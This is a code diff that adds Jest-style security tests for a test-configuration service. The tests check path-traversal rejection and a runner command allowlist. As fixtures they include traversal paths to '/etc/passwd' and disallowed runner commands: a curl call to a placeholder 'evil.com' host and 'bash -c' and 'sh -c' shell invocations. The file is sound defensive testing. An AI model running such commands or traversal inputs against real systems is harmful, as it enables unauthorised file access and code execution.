@@ -303,6 +303,147 @@ suites:
       expect(Array.isArray(suites)).toBe(true);
     });
   });
+
+  // Security Tests
+  describe('security: path traversal prevention', () => {
+    test('should reject config path outside project root with ../', () => {
+      expect(() => new TestConfigService(testProjectRoot, '../../../etc/passwd'))
+        .toThrow('Config path must be within project root');
+    });
+
+    test('should reject config path that resolves outside project root', () => {
+      expect(() => new TestConfigService(testProjectRoot, '/etc/passwd'))
+        .toThrow('Config path must be within project root');
+    });
+
+    test('should reject config path with hidden traversal', () => {
+      expect(() => new TestConfigService(testProjectRoot, '.agency/../../../etc/passwd'))
+        .toThrow('Config path must be within project root');
+    });
+
+    test('should accept valid config path within project root', () => {
+      // Should not throw
+      const service = new TestConfigService(testProjectRoot, join(testProjectRoot, '.agency/test-config.yaml'));
+      expect(service).toBeDefined();
+    });
+
+    test('should accept default config path', () => {
+      // Should not throw
+      const service = new TestConfigService(testProjectRoot);
+      expect(service).toBeDefined();
+    });
+  });
+
+  describe('security: runner command allowlist', () => {
+    test('should fail validation for disallowed command (bash)', async () => {
+      mkdirSync(join(testProjectRoot, '.agency'), { recursive: true });
+      writeFileSync(testConfigPath, `
+version: "1.0"
+runners:
+  - id: malicious
+    command: ['bash', '-c', 'echo hacked']
+    outputFormat: raw
+targets:
+  - id: test
+    path: test
+    runner: malicious
+suites: []
+`);
+
+      await configService.load();
+      const result = configService.validateReferences();
+      expect(result.valid).toBe(false);
+      expect(result.errors.some(e => e.includes('disallowed command'))).toBe(true);
+    });
+
+    test('should fail validation for disallowed command (curl)', async () => {
+      mkdirSync(join(testProjectRoot, '.agency'), { recursive: true });
+      writeFileSync(testConfigPath, `
+version: "1.0"
+runners:
+  - id: malicious
+    command: ['curl', 'http://evil.com']
+    outputFormat: raw
+targets:
+  - id: test
+    path: test
+    runner: malicious
+suites: []
+`);
+
+      await configService.load();
+      const result = configService.validateReferences();
+      expect(result.valid).toBe(false);
+      expect(result.errors.some(e => e.includes('disallowed command'))).toBe(true);
+    });
+
+    test('should fail validation for disallowed command (sh)', async () => {
+      mkdirSync(join(testProjectRoot, '.agency'), { recursive: true });
+      writeFileSync(testConfigPath, `
+version: "1.0"
+runners:
+  - id: malicious
+    command: ['sh', '-c', 'whoami']
+    outputFormat: raw
+targets:
+  - id: test
+    path: test
+    runner: malicious
+suites: []
+`);
+
+      await configService.load();
+      const result = configService.validateReferences();
+      expect(result.valid).toBe(false);
+      expect(result.errors.some(e => e.includes('disallowed command'))).toBe(true);
+    });
+
+    test('should pass validation for allowed command (bun)', async () => {
+      await configService.load(); // Uses default config with 'bun'
+      const result = configService.validateReferences();
+      expect(result.valid).toBe(true);
+    });
+
+    test('should pass validation for allowed command (npm)', async () => {
+      mkdirSync(join(testProjectRoot, '.agency'), { recursive: true });
+      writeFileSync(testConfigPath, `
+version: "1.0"
+runners:
+  - id: npm-runner
+    command: ['npm', 'test']
+    outputFormat: raw
+targets:
+  - id: test
+    path: test
+    runner: npm-runner
+suites: []
+`);
+
+      await configService.load();
+      const result = configService.validateReferences();
+      expect(result.valid).toBe(true);
+    });
+
+    test('should pass validation for allowed command (jest)', async () => {
+      mkdirSync(join(testProjectRoot, '.agency'), { recursive: true });
+      writeFileSync(testConfigPath, `
+version: "1.0"
+runners:
+  - id: jest-runner
+    command: ['jest']
+    outputFormat: jest
+targets:
+  - id: test
+    path: test
+    runner: jest-runner
+suites: []
+`);
+
+      await configService.load();
+      const result = configService.validateReferences();
+      expect(result.valid).toBe(true);
+    });
+  });
 });
 
 describe('Test Configuration Schema', () => {
